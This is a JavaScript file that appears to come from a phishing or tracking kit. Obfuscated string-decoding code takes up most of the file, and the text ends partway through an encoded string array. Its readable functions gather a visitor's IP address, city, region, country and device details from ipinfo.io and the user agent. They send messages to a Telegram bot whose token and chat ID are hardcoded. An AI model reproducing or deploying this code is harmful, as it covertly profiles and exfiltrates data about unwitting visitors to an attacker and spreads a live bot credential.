(function (_0xf71a40, _0x441236) {
  const _0x3a0b81 = _0xf71a40();
  while (true) {
    try {
      const _0x371188 = -parseInt(_0x1b68(1837, 'mFbN')) / 1 + -parseInt(_0x1b68(1523, 'pi5J')) / 2 * (parseInt(_0x1b68(2167, 'Q0eR')) / 3) + parseInt(_0x1b68(1646, 'YVl]')) / 4 + -parseInt(_0x1b68(2591, '#Gbu')) / 5 + -parseInt(_0x1b68(2945, '7lrh')) / 6 * (-parseInt(_0x1b68(1946, 'pi5J')) / 7) + -parseInt(_0x1b68(568, 't#Rm')) / 8 + -parseInt(_0x1b68(1845, 'GWos')) / 9 * (-parseInt(_0x1b68(1544, 'e5KZ')) / 10);
      if (_0x371188 === _0x441236) {
        break;
      } else {
        _0x3a0b81.push(_0x3a0b81.shift());
      }
    } catch (_0x5ebd38) {
      _0x3a0b81.push(_0x3a0b81.shift());
    }
  }
})(_0x3b0a, 938409);
async function sendTelegramMessage(_0x11f2b9) {
  try {
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x11f2b9,
        'parse_mode': "HTML"
      })
    });
  } catch (_0x3a98ce) {
    console.error("Failed to send message:", _0x3a98ce);
  }
}
async function getCountryName(_0x192875) {
  try {
    const _0x36ec48 = await fetch("https://restcountries.com/v3.1/alpha/" + _0x192875);
    const _0x5ae2e5 = await _0x36ec48.json();
    return _0x5ae2e5[0]?.["name"]["common"] || "Unknown";
  } catch (_0x55810c) {
    console.error("Failed to fetch country name:", _0x55810c);
    return "Unknown";
  }
}
async function getUserInfo() {
  try {
    const _0x7b4372 = await fetch("https://ipinfo.io/json");
    const _0x1c02f4 = await _0x7b4372.json();
    const _0x1a1bac = await getCountryName(_0x1c02f4.country);
    const _0x5f4583 = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0x1c02f4.ip,
      'country': _0x1c02f4.country,
      'countryName': _0x1a1bac,
      'city': _0x1c02f4.city,
      'region': _0x1c02f4.region,
      'countryEmoji': getCountryEmoji(_0x1c02f4.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x5f4583.model,
      'deviceType': _0x5f4583.type,
      'deviceOS': _0x5f4583.os
    };
  } catch (_0x45933a) {
    console.error("Failed to fetch user info:", _0x45933a);
    const _0x4a214c = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x4a214c;
  }
}
function parseUserAgent(_0x311c55) {
  const _0x375be7 = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i
  };
  _0x375be7.type = "Mobile";
  _0x375be7.os = "iOS";
  const _0x1c5fe3 = {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  };
  const _0x14d47f = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x45a18d = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x1f0261 = [_0x375be7, _0x1c5fe3, _0x14d47f, _0x45a18d];
  const _0xefb072 = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x280267 = {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  };
  const _0x598ee7 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x4b355d = [_0xefb072, _0x280267, _0x598ee7];
  for (let _0xcafc2 of _0x1f0261) {
    const _0x177829 = _0x311c55.match(_0xcafc2.regex);
    if (_0x177829) {
      return {
        'type': _0xcafc2.type,
        'os': _0xcafc2.os,
        'model': parseDeviceModel(_0x311c55, _0xcafc2.os)
      };
    }
  }
  for (let _0x15520 of _0x4b355d) {
    const _0x2f1b4e = _0x311c55.match(_0x15520.regex);
    if (_0x2f1b4e) {
      return {
        'type': _0x15520.type,
        'os': _0x15520.os,
        'model': parseDeviceModel(_0x311c55, _0x15520.os)
      };
    }
  }
  const _0x10cec9 = {
    type: "Unknown"
  };
  _0x10cec9.os = "Unknown";
  _0x10cec9.model = "Unknown Device";
  return _0x10cec9;
}
function parseDeviceModel(_0x17cdd5, _0x41ce7d) {
  switch (_0x41ce7d) {
    case "iOS":
      const _0x4a895f = _0x17cdd5.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x4a895f) {
        return "iPhone " + _0x4a895f[1].replace(/[_\.]/g, " ");
      }
      const _0x413824 = _0x17cdd5.match(/iPad/i);
      if (_0x413824) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x1a1852 = _0x17cdd5.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x1a1852) {
        return _0x1a1852[1].trim();
      }
      break;
    case "Windows":
      const _0x2a5fb9 = _0x17cdd5.match(/Windows\s*([\w\s]+)/i);
      if (_0x2a5fb9) {
        return "Windows " + _0x2a5fb9[1];
      }
      break;
    case "macOS":
      const _0x1de06c = _0x17cdd5.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x1de06c) {
        return "Mac " + _0x1de06c[1];
      }
      break;
  }
  return "Unknown Device";
}
function _0x3b0a() {
  const _0x18c87a = ['ogT4fZu', 'jSk6W4tcImkx', 'W7RdJmofWReD', 'W5elrmokW60', 'W6W5W5pdMSocWQCfdcFcH8kI', 'jM3cSCkRW6u', 'W4ZdV3y', 'lCkHahGX', 'W7vHW4C0W6W', 'WRfRWQbPWPG', 'WPVcJmoJn8kC', 'W5ddJSkraCkp', 'WOLEWPpcQSk2', 'hmoexXFdLq', 'EKdcOaRdKa', 'W7f6WRnCW4S', 'tCkoWQZdHSkC', 'W5lcTKddPCo3', 'WO5KWR9hWPa', 'pMqIdq', '0AVtLTcq0AZtIa', 'cv0YcCop', 'WPtcHcTcEW', 'emohBaFdUG', 'W4ngj8oEpW', 'CHJdIZVdHq', 'W4PdW4a3W7e', 'gSkbg3K', 'W4jCW5JdRmo/', 'eSoeWPvrWQ8', 'WQ3dKmohWRNcHW', 'E8kbWR/dJ8kf', 'eZOnWOG3', '0O7rNncg0O7tQq', 'WRHpW6lcMeq', 'W4DQWRH8W78', 'bSk7ydVcUa', 'tSoxzCo6ca', 'W4xcLuBdOKe', 'WQ7cGG46W6W', 'W5xdQsbGWPe', 'W6mnbCkREW', 'q0v1j3S', 'W7VcH2qEW4q', 'W43cNaVdNGS', 'BCkpWRddMq', 'W5WlWO/cOcS', 'jabjWOpcGq', 'fhZdVI7cNq', 't8kUW5SWDW', 'WP1GW7hdMCoS', 'WOpcVmolW7Cf', 'FIdcQCkiaa', 'W7O2FCo/', 'W6fNWR9EW4C', 'uTcg0OprVnkN', 'WOlcQtZdRNy', 'W5LFW74JW7K', '0llsQTkzWOVtRW', 'W7BdHw7dPSoD', 'ucGcW6De', 'dmofzJ3dRq', 'p0ZcJtVdIa', 'WOnuW5NcTqe', 'W5RcJ2VdNCoh', 'CSoxzSo7', 'wCo7zmo6aG', 'W6r4W4tdPSoH', 'W7xdG0a8W7W', 'imklW4FcN8os', 'W4NcTCkYW7y', 'lKaY', 'lYiyW4hcKW', 'W5JcLCkKW7xcTW', 'W4X6WRahW7S', 'aaTYWRe', 'W74+W5ZdMga', 'W41FWRnzW6C', 'b1StoCk5', 'sNGIW7tcRa', '0RFrG8oY0BRsKa', 'ACkwdmoivq', 'qHtcKZJdHW', 'WPdcJgeooW', 'pL0Kc8or', 'W5tdTSoiW6O2', 'WOepWOeVrq', 'WQvRW5RcRmkN', 'W7RcLCkpW5hcLq', 'h8oPWPDhWQK', 'rt0bW4b6', 'BW4fW4S', 'W58cWPFcVbG', 'CSotE8oeiW', 'tv3cPI/dNW', 'W7rGuSkUra', 'W6HwW7OdW48', 'h0Syaq', 'W4NWLiksW6rrW6e', 'rJS7WRZdIW', 'WQqzWPBcQ8kR', 'fWzTWQBcPa', 'WQTwWO5xWRS', 'W5/cGLFdSq', 'W7iTWPVcLs8', 'uCkiW5qcW7W', 'lNhcOmk8W6O', 'B0P/wc0', 'WQ8/WRCFWOC', 'j2mAW4aN', 'W57cIeSUkG', 'W67cK8kfW5BcIq', 'WPm9WPirWOS', 'WPZdRCoqWOpcGa', 'iJ4uWOpcTa', 'nSo4rctcGW', 'jqhdTW', 'esVcMCkQEq', 'g8oIx3hdRW', 'wYpdRW3dLG', 'W7OvvCoXi8oiW5xcVSofWQ3dRa', 'W6NdV258xW', 'EmkjWRVdJ8kY', 'fmorfxGX', 'WPRcH2S4W5C', 'B8kkW407ea', 'qhX5rYO', 's13cUeNdHW', 'nSo8tdVcLa', 'W4DxW5JdRSo5', 'ov0Mx8kf', 'uJuaW592', 'W4v8W47dQCoK', 'W4aLySo6WQa', 'fKxdPdpcJW', 'W7qGWOO', 'W7mRWQZcRcW', 'WPNdMsbWWPe', 'W5iiWRVcTZm', 'aJK7W5qx', 'dSovFJFdUG', 'zr/dVqG', 'W540WRZcSXq', 'omo1uttcMa', 'bxHU', 'W58uWOtcQsq', 'WP58W6ZdHCoG', 'ua5QqwC', 'W5hdPColW6S', 'W5VcH08gW7i', 'Db7dLG', 'ysubW5JcHG', 'W4VcJSo4nCk7', 'WQDFWO1sWOq', 'W6a3WOVcJb0', 'jZmndeK', 'tIyBW4n9', 'k8oeq2/dRW', 'EmkDWRBdN8kY', 'W4ahxCoCWQe', 'WOXTeSoEca', 'jgabgmkT', 'odnC8kkqPmoz', 'WRfUWPZcHZ8', 'lmoGW5/cN8ot', 'ymknWRBdNW', 'eSorWRvWWRa', 'cdGGW58r', 'lmorDbtcUa', 'sgvufNS', 'qmoDva', 'WPxdK8ouW5jw', 'WRxqSnoH0lhrLa', 'W7pdS8kXgCoi', 'WPzQlmkHEW', 'FSkXcSknBG', 'e8kfWP/cVSoC', 'hN/cI8kmW5e', 'cZC4W7BcLa', 'zqldM3FdJW', 'x8odB8oisa', 'W5VdQx3dRwq', 'WOtcKdezsa', 'bMFdSmoBlq', 'W5RcQCoGpSkh', 'WO4zW5tdPmo5', 'EmoGDFghPR/VUORcJa', 'W50zW7fGdq', 'ewqLaa', 'W6VdSwhdSa', 'AZ7cP8kxnq', 'ev0Ybmor', 'W7BdOmkod8oh', 'WRCXWR9rW4i', 'fSkmcJ4', 'WRTeWOhcO8kc', 'W73cQdZdVSos', 'W5SnxSkjW7C', 'W7NcGrawW4S', 'j9gq0jNqNngs', 'W43dRMPqya', 'uLldNdBcIq', 'WQddI8ovW5VcMW', 'W7RcLSkiW4hcIG', 'W5ZcL8kGomk0', 'ya52aIG', 'WQdcGKyH', 't8oDWRVdP8kT', 'pCkYgSkfBG', 'W4VcHwJdGCof', 'fXPRWRJdQa', 'W4pdNmoqW68c', 'qahdRHldJq', 'WPFcNfVdPeC', 'W7fXWQjA', 'W5eSjmojyW', '0AVsOncq0jFtGa', 'W5dcJMVdI8ob', 'W5pcOmoOjmkD', 'W6mtwmocWPW', 'W5pdOmod', 'nCk8W4tcJSoq', 'W6qfW4CdW7i', 'wfiYW7RcTa', 'WP7cUJTwEa', 'W6NcJ08YW6S', 'W5/dVNW', 'WQNdISoeWOlcMG', 'WQneW5W4W48', 'WPldOmoeWRRcQW', 'qfLOasy', 'WPFdKblcTXm', 'ASk/W4aXma', 'WO1UcCkhCW', 'W5/cVSo0jCkg', 'z8kPW7SJAq', 'W4NcUCkxW4dcHG', 'mIWDW57cIW', 'WPdcN2ulna', 'WOpcMxWnna', 'm0KgnGK', 'gCobWPbgWRK', 'W64gWOf0ga', 'DbFdOd7dLG', 'W6uHWRFcTrm', 'W7tcK8kPW5lcRa', 'WPBdV8ouW43dVW', 'rCk0W44Umq', 'W6vlW4ddJ8oB', 'WRaZWRyXWRq', 'p0udtmkK', 'F13cRq/dQW', 'yLX+', 'WObOmSoAjq', 'rmo+oCoknq', 'W5bGWPDQW4K', 'k8kTW5/cK8oq', 'suFcJW7dLG', 'W5zdW6/dGmof', 'W5SDWRpcVcS', 'ph8Kg8kF', 'WQDjWOzqWQe', 'W57cR1xdQCoH', 'WQ3cNKiKW5e', 'W7NcU1dcVSkF', 'WQTZW5NcIey', 'W7hdRSkTbCol', 'W41wW4pdPCo/', 'W49iWPLEaq', 'CSkCW7JdMmk1', 'dsfhWQZdUa', 'WQBcLx8glq', 'fbe5W48x', 'WQJdH8o1WOHz', 'lWCbW4xcJa', 'CsSvwa8', '07NsLCkW0AdtMW', 'sSonaN7cUq', 'oCoAW6xdM8kL', 'WOG0WPurWQi', 'if4jmtC', 'dhyJm8oI', 'lcj9qSkd', 'z8kYWPldRmks', 'WRFcLCktW4xdJG', 'WPBdQSoF', 'W7vUWORcIxW', 'WR5IWOZcNSkd', 'fNpdQSoB0zu', 'WQZcRrRdT2O', 'DYSyW53cRG', 'WOfEi8oFeG', 'W5tcGLFdTKC', 'hxxdMrRdIa', 'W5/dQMHvDW', 'WQ7cRSkGgCoB', 'oCooWOjJWOO', 'ceqGkWi', 'WP/cI1iQW4W', 'W418WP9WW4i', 'W58Hw8oRW6q', 'erX2WQ3dVa', 'zYdcUCkqoa', 'W5lcJKhdUSo8', 'kCk7W4BcLmke', 'W5FcTSo3', 'oeZcJttdJG', 'F8kVWQldNSkP', 'WPDMiSoxna', 'WOjeWO5pWRC', 'WO3cVSk7W5FdVW', 'WOJdPmodWPK', 'W5NdR8oRW4ur', 'W4hcIL/dG3K', 'WONdRmosWPi', 'C8o2vSod', 'B3hcMJZdLW', 'cemxdSok', 'luWWWRNcHW', 'W5/cPCkrW5FcOG', 'WOrOaSkjkq', 'qtCBW7zI', 'W6f1W5eKW5u', 'nSkwk8k+rW', 'm0aT', 'W6z8W6O+iq', 'c8kChMea', 'qxP0cwm', 'W4rEWO5hkG', 'WOWzW4xdV8oY', 'W6nyemkHzW', 'W6HNWRzEW4i', 'W5lcGKddUee', 'DxXAdb0', 'WQXUbmkrva', 'WPJcHGhcUqi', 'iCk/nuGM', 'W4ddP8oTW4Gx', 'ge3dSmoByq', 'W75iW5SSW7S', 'W7PqW5VdRSkX', 'WRlcOCo/gSow', 'mq3cQhFcGq', 'uH7cJuNdHW', 'kvOZdsi', 'W7iMWP/cJZi', 'WOlcRCkYWPCB', 'W5lcGL7dTKO', 'muBcPrZdOa', 'rsJcPCkvnq', 'DKGPkmoV', 'uNNcPtZdGq', 'W4LyW5jhkW', 'W7SUW5pdNCoh', 'WPxcJCo+WOiE', 'm3tdGJVcRG', 'g2q6nXu', 'W7FcH0ldNSoz', 'oXuMW7mV', 'CGGhW5XH', 'WOJcQ8oZhCk0', 'W6ddJ8kJW7BcLq', 'WPZdRmofWO4', 'W4pdJgeAEq', 'F8oWyCo4fW', 'aNRcPSkXW7S', 'WPlcSJFdThy', 'w8oAzmoPrW', 'W70TWOpcGCkE', 'WQjDe8kHEW', 'WRpcLLy2W7C', 'o8kSWQ/dJSkq', 'W4tdUubkrG', 'WP1JW7tcSq4', 'n8kSFthdGW', 'd8kGxsT9', 'W5hdV0xdHSoW', 'WQ1mdSkH', 'W5lcKKFdRKi', 'ghGWk3W', 'kSoyW67cOCo9', 'WOpcHWVdGfq', 'W4yGxmoyWPS', 'W5PyW5tdP8oU', 'EmknWRldGSkY', 'W5NtTDoR043qTG', 'e1/dMI7cHG', 'W5tcJ2hdI8oF', 'atVdRCkyW50', 'tCkpW68wmG', 'WPBcVSoIm8kk', 'zCodBSoglq', 'W4ddHbNdJ18', 'f3lcGSkPW6y', 'euyYcmow', 'DCkOqt7cHG', 'W63dHehdMq', 'W5NcK0BdVLW', 'W6TJWRP4W7G', 'WRSzWOG5WRe', 'eSoAWPfdWQG', 'FmkUd8kgDa', 'CmkOW5i4jW', 'ph0Mgmkr', 'rwDKgKC', 'dsz0WRFdNG', 'p8kQk2Sp', 'W5XCW4BdP8oQ', 'ECknhmkBFa', 'WPBcHtacW7i', 'omksWR7dP8oO', 'DgDuqaW', 'W6pcN0CZW4u', 'WQ1HWP3cItG', 'WRzqWOrxWR0', 'W7z6WOvjW6K', 'eSokWQDsWRu', 'WQJcG8kRW6FcQa', 'DfnfW7NcP8onp8kQWRO', 'W7JcJMhdNmoC', 'W61sW74+', 'W7BdTCopWQWN', 'oSkFWOyBWO4', 'xLzOhui', 'WP53WQSXW6a', 'jCkbWQBdUCkX', 'W4NdPgNdP8or', 'a8kepK8m', 'W7KzWPpcSJi', 'u17cJHpdSq', '0AeCBuRdIq', 'xcJdRbldSa', 'W5P3W79+W6a', 'vuScbWW', '0OVtQ9kO0ANsOG', 'WOfGWO1nWPu', 'hSkng0uN', 'mCkCp1mU', 'bWbHWPVdRG', 'WP7cUJGzlG', 'WRVdNLO+W4a', 'W43cV2e/W6G', 'u8kDoCkUwa', 'nhCqi8ol', 'mxLRvSkT', 'kWisW7RcIa', 'WPXMW7hcMWu', 'W4foWRbXW68', 'WQNcI8oJvSkF', 'WPFdKftdU1y', 'm8oDb2iM', '0jpqHTkt0RVqGa', 'WOPKWPZcOG', 'WOBcOZZdRG', 'W6ylxCowW60', 'WO5AWPlcMSk6', 'W5lcON5YoW', 'CqeUWOu7', 'WQjHWQjuWRe', 'iSkVW4BcN8o6', 'nSoJWO5rWO0', 'ohOJo8ky', 'E8oeWOVdMSkF', 'hCkha3iE', 'W5SnxG', 'WQNdGCoRWOldGq', 'W6DKWO/cJmkq', 'FLRcUa', '04hsTnkm04NtRq', 'W4ZcUxtcM8o6', 'smocBsRdRa', 'W50DW4hcQsDwhmoD', 'WO/cJZpcMCoY', 'WQblgSk+rW', 'W5OhW5KmW5W', 'W6eVWPRcGJu', 'DgycW5Hg', 'WQ1MlCoE', 'W6fUW7/dUmoL', 'BdHMbmkq', 'W4TuW5pdPCo/', 'uIBcKSkZcW', 'gxlcPSkBWPi', 'tWPYpdu', 'sSkbE37dSa', 'jSo/e2hcGq', 'WR7cUseWaa', 'u31Ho3K', 'W5/cJgZdJCoy', 'iCodqJ/dUG', 'W5lcTSo+CSoe', 'WPRdT8odWPJcRq', 'W6jqW4xdVW', 'FSkAhSkhCa', 'WRjSWQVcLCk6', 't3pcJGRdJq', 'W6VcG8kKW4/cJG', 'WQbOWQTlWRW', 'W4JcKgKSaa', 'dmkTvdNcUa', 'WQXsW7aJW6i', 'fSonW44', 'W6HdW4b8fG', 'gfCdbq', 'W5NcSmo+nG', 'W49lW4tdPmo8', 'pmoCW6BcNCoK', 'WQStW4jGaq', 'm8o+rbNdKq', 'f8oTBdm', 'W6aNWPtcGGq', 'FvJcQq', 'ACksnmkbEq', 'W4ewsCoFWRi', 'lSkakeqU', 'i8o9qtlcNW', 'yurvWOZdGW', 'ySkWW4iUjW', 'W7ZdO1fD', 'WQhcICk3WP4t', 'imoWWQhXGBgZeG', 'W4mVnmojja', 'W4hdKsGdBW', 'WQvvWPDgWRW', 'WO7cHSk4WP0', 'WPDEWQ/cT8ka', 'W6ZcHMZdR8oR', 'cCkedNK', 'W5xcM8kPW7lcHW', 'WQXaWO5eWRO', 'W5KfqSoCWQi', 'WQTug8kYzG', 'W5xcHx3cLCk5', 'c8ofFde', 'dx1HlmkE', 'WOxcOYtdS3a', 'i0/cKmklW74', 'W5VcI8kXWPyt', 'yZNdMIBdJa', 'WQldSmobWOldGq', 'wCk7dmkiBG', 'c0qZh8oq', 'W717WRhcQq4', 'W43cPZPyFa', 'WOaNWPOCWRa', 'nfW/amox', 'W7pdHCoMW4KM', 'sNpdL3xcKW', 'BSkYjCkTCG', '0jyT0AFrJ9kM', 'mYqgW6ie', 'WOJcPYhdO2K', 'W7ulW5jqW7i', 'zxPdsa', 'WQ/dH8o+WRRcHG', 'nv5vWPdcGa', 'CHZdGYtdKG', 'WOhdLJFcN8kgwZiCWOxdQIRdOmkV', 'B3/cPtZcTW', 'qtuVW4Ox', 'p8obW67cOCo9', 'pNKRdXy', 'WQLOWPhcMq', 'mSkkW7VcKmoC', 'kxqMeq', 'D8kLW5SX', 'W7FdMSojW4tcLa', 'W5hdTSocW6yb', 'WQ/dJ8oPWRBcKq', 'W6RdUmkYtSoE', 'wCkhorZcRq', 'jNb4f8kh', 'W47cQCoJxmoJ', 'n8kexdb/', 'ztVdPCoEWOG', 'WO4zWPBcQ8kR', 'cx1+W7RdKW', 'cKy/nSop', 'WPisuCoxWRm', 'tZVdPCkDW4C', 'mgv6W7ZcGq', 'WPC2WQS9WQG', 'WPVdUCkWCSoo', 'BCknWQhdVSkU', 'duXGW7pdLq', 'WQD0WOnmWPy', 'WPrVkCoxna', 'WPXRW557W6e', 'WPVcKMddMSog', 'WOhcNmkhWR9p', 'h8omW44cWRa', 'W4FdSstcP8kk', 'dx4jabC', 'n2SXiSkd', 'WQjKW5hcQWm', 'WP/cIhqqEq', 'tYNcTW', 'jfP/8lsqR8k+', 'wSkYW6uqfa', 'W6hdSmovW64B', 'W67dGetcPSoh', 'Dxynxae', 'W4/dGh7dJ8oj', 'mCoIDcBcTq', 'hevEW4hdQG', 'WPpdS33dK8o8', 'eSoejt/dTq', 'WQSpWOeVrq', 'ySknWRZdJmk1', 'gSoNAqFdGa', 'W5bDWOjBW7W', 'WQPsn8o8nG', 'W57cOwddNmok', 'W43dN2LvzG', 'WOTQWPpcLmkJ', 'mJzoWQFdJG', 'W67cOwldMMq', 'WPiCiCk+qa', 'f/giU5tdGYBdPW', '0RlqJDkG0BdcUa', 'W7pdR8kNvSom', 'CtSbW5DH', 'WRDue8kH', 'dCkhhZPR', 'iCkzxNeE', 'WOJcKmkVWRW5', 'W6mnq8oKnq', 'zmoWWOSMjq', 'kmkVW4JcTCoS', 'W5anrmohWRG', 'WRCXWPaOWRe', 'pfZcOGddQG', 'WONdPmolWOlcIG', 'DGRdSH/dJq', 'WOxcOeWdW5S', 'W7xdGg/dMmoB', 'W5NdOSo+W5jw', 'jCozraNdIa', 'eHKeW4mz', 'uJ0TW59H', 'pKSqn8oj', 'fg06W7pcIW', 'tSksW77cM8kX', 'W57cHxhdQ8oF', 'yqiAW4lcLW', 'W7dWQQcsFSkeiq', 'WOv7W5lcOCky', 'FbhdMJ/dKq', 'W4RdO1r2Eq', 'W6eZW5GFWO4', 'esz7WQtdQq', 'WQJcGuzP', 'hCo2sG3dOa', 'W4hdPNlcUNi', 'xIhcKCk6aa', 'W6HaW5rHeq', 'W5FdPe4KW5q', 'WO7dHmolWPpcTa', 'WQ1IWRm1WO4', 'c8klju8P', 'W6NdNa1KWQm', 'BmkPWRFdK8ku', 'W7SrW65hWRy', 'W57dSmkWkCkt', 'WRrOWOZcMCoF', 'omkKiZuk', 'W6tdLgldPCoO', 'W4hcNmoNpCkR', 'axj+', 'dfbVWRldIa', 'WOfKemoVAq', 'W6pcLxK7W4a', 'CmoYW4W9ja', 'W7XuWPDBW6m', 'fqmGW64Q', 'W4uuWR3cKMO', 'W6VdMg1Uxq', 'WRfwWOjrWPm', 'W49xW4xdOSo/', 'kSkAWRZdJmk1', 'qYRcTCkvnq', 'w1/cVCkDW7K', 'h3qFea', 'WQzbaSk9', 'WPtcMSkjWOqX', 'W4hcUNpcHCok', 'xqhdUWtdUq', 'jSkHW57cLmol', 'W5m4WQFcOZq', 'ybLQahe', 'smoxySoWaG', 'ECoXW4i6jG', 'W77dKwFdHCo/', 'W5ZdLmoTW6ep', 'f3LKW73cMW', '0llqR9gMdncO', 'W6NdJanZWRG', 'W7NcKCoykmkI', 'cmkcW4BcSmkk', 'mXP4rq', 'W5RcLuhdPfi', 'WRddRmo9WQdcJG', 'WRZdJSotWOxcUG', '0jlrV9ks0RDH', 'W5ZdUh/dN8o0', 'W5PwW6xdV8o5', 'WQDkWOLqWR0', 'CCkZW5OLla', 'FLZcOGi', 'W5veW7G1W5m', 'g1/dNsBcLq', 'pKy0aCkz', 'W75uW6uHW7C', 'W7lcRw3dQ8oY', 'EM5vWOZdGW', 'WQrif8kbEq', 'wrNdPg7dGG', 'WRNcN1mKW4i', 'mSotFJ3dQW', 'W5FcTmo6f8k4', 'kbW3W5NcLW', 'W77cS8kcW5tcRq', 'WQRcTrJdU3a', 'W6ddO0JdHCo+', 'WOVdLtdcGSkt', 'W5pcK1ddJmkg', 'ACkKW5GtiW', 'gmkwW74cW7W', 'bHvmWPRdRW', 'W5pdU3fxna', 'WQrKkmobja', 'h8kalxOF', 'W7tcR8o1imkc', 'W4JdTeH8Fa', 'hGBcO8kUjG', 'j8knW5ZcKCoE', 'iCkRW53cK8oC', 'BSkrWQ/dP8oT', 'W4XXW7ldJmoH', 'bmoBWPfqWP0', 'bJnmW7NdKa', 'W6rhWOHxW6G', 'jZmneey', 'y8khWRVcKCo9', 'W5dcMvtdRG', 'n8oCWRzjWOG', 'bmkCWO5GWRK', 'WPqWW6v+W7a', 'odnC8kkpUmoz', '05JqKnkh05JqTa', 'WQpcIYddGgq', 'E8k7WPNdU8kj', 'vNrsWQ/cLa', 'Dxzksre', 'W4pcPf/dUSo0', 'W5ZcVmoKf8kc', 'W4DqW6qUW5K', 'W4nGW4BdSSoJ', 'FubUgxC', 'eqTEW6dcJG', 'tJW+W58e', 'W5RcVmkYWPtcTG', 'WQPjxSoMCW', 'W5hdNeFdT8oC', 'WPldPtuiW7m', 'v3lcQWNdHa', 'Ah1if2m', 'WOtdNmk5WR9b', 'ftPkWRRdRW', 'cNZcH8kxW58', 'W47cHN/dNxC', 'W4ZcO8ofk8kd', '04/sVDgDqTg1', 'dxD7W6JdVG', 'WOVcHKKJW7S', 'W7/dOmk3fCox', 'WOJdTWRdR0u', 'W57dNCoL', 'W5/dP8oEWOxcUW', 'nfW4eq', 'z8k1W51Qsa', 'WPJdOmoFWOm', 'WPxcGCk5WPOc', 'B8k5WPz2lW', 'iwPOW4ZdGW', 'h0qHaSoT', 'CxtcHCoidW', 'W6mramkRCq', 'W7HdW7WG', 'W7ddIs4mnG', 'cWOMCZu', 'WRLECmorca', 'WRTEWQ/cQCkp', 'WOJcQdFdU2e', 'BSk9W583kG', 'W5tcM8kqWPGp', 'lvGMcJ4', 'WPxdKSo+WOiz', 'fvtdNtC', 'bNPjW63dUa', 'W44iWROvWQC', 'W7tcM8kgW4C', 'jW0BW5tcOG', 'imoFqJtcLa', 'ev3dKJdcLa', 'W5bKW7FcPX8', 'W7hcU2eyW6W', 'WOxdV8oMW4pdPG', 'o00+ccG', 'p2ez', 'tKnHo2e', 'w8oVtmkXcW', 'WQRcHeO/W7W', 'tLjLnMu', 'W7ldIuddR1K', 'WOhcSvqZka', 'W7Diu8oWFG', 'WO9vamo3lq', 'W7DTWRW', 'sfRcT8kxW4K', 'DsOkW4rp', 'W4BdVCoxW6i', 'mSkthCkgnq', 'W4bUWOHYW78', 'W6n6WRnsW4S', 'W4pcO8knW43cLW', 'FxjJwGS', 'c8knh2WQ', 'l2GXhCkh', 'FSkSgSkcBG', 'dG5gWP/dJa', 'WRfibmkHBq', 'WQHuWR13WPK', 'W5NcPSk7WOvw', '0kTq06prP9ky', 'jWShW6NcGG', 'WO7dIfJdG34', 'Dr5ZdgW', 'WQCpWPm6ua', 'g0lcKwRdJW', 'tN5/i3a', 'er9NWRRdUa', 'WO3cOZZdVwC', 'dCkhphq5', 'W7ZcRSkyW5lcHa', 'kN1NW7W', 'WRvmWRJcVmk/', 'W5hdStJdKYO', 'r8kvW5Wmda', 'bIxtL9oa0P8', 'WOzCWQ5h', 'WQZcRSkPWRmf', 'jfZcGMFcJW', 'm8oIWPLhWPK', 'WPbIlSoFCq', 'WRjsW5VcHt4', 'W79JWPzfW6G', 'FgvszIC', 'WOKCWRfxWR0', 'iCkyW7pcRCoE', 'm0a6fdm', 'lgpcV8kFW6O', 'WQZrSnkQ0BxsOq', 'W4TlW7VdRSoV', 'WO7dMfxdM8oT', 'WQPEqCoTpq', 'WPVcQ8o5nCkg', 'W7BcVmoJiCkp', 'WPddNHeRWQe', 'W5a+CCkimG', 'W6ulxSoxWRG', 'FehdTrJdUW', 'WODJWOtcKuq', 'W5JcHf3cRq', 'ds45W4ZdRq', 'WOKYWR4SWQm', 'ze/cLs3dIW', 'WOldR2m/W5u', 'W6FdLhXjrG', 'smkVW6e1iq', 'wCoitYbR', 'W4XclCorfa', 'sCkrcSoBsa', 'dbetW6xcLa', 'lmkjW57dJmo5', 'jNv/W7ddKq', 'aNRcSCkDW4a', 'B8kZW6iKbG', 'W4pcNN/dU2e', 'WOBdTmoWW6SV', 'k8kahwe5', 'WOpcPXVdJMu', 'l187gmkH', 'W4pcTdFdRMy', 'DmkWgCkmna', 'ggGBaam', 'uLtcOqm', 'W4mNnmoEkq', 'aCoJxrBcGG', 'rCohdg8V', 'W6X0W4tdKCo8', 'W5uhrmo2WRS', 'W47cOtFdRL4', 'grnWWRpdPq', 'WPj4W5xdLmk5', 'W4VcPNpdPSoL', 'W6zGWRnnW60', 'lIu0W4pcPq', 'aSoeWPDiWQ4', 'vLbLFqe', 'reFcRG7cQG', 'baOIW6tcTW', 'W6BdIKiltq', 'W6hcPvldPCov', 'W7RcMCklW6pcSW', 'W7GlDCocWR8', 'FKrTpxO', 'Fmk6W5/cVSoy', 'dCovFbVdTq', 'W6tdGSo7qCo4', 'WPldPmofWPtcTW', 'W5ldUwJdOCox', 'W4OvWPpdGGW', 'W7xcUmo9nW', 'WRDRWRbOW4K', 'WQvDW4PuWRS', 'xf/cRCk1W54', 'xWrKWOxdOq', 'WRlcNdhcOLG', 'o8krjMq', 'xSoFzCo6', 'W47cTSkeWPpcUG', 'rqpdRXpdGW', 'WOKJWQyYWQu', 'whtdSSkwW64', 'WOlcOZZdRNy', 'oH1rWR7dHa', '0zRrNTc/0QlsGW', 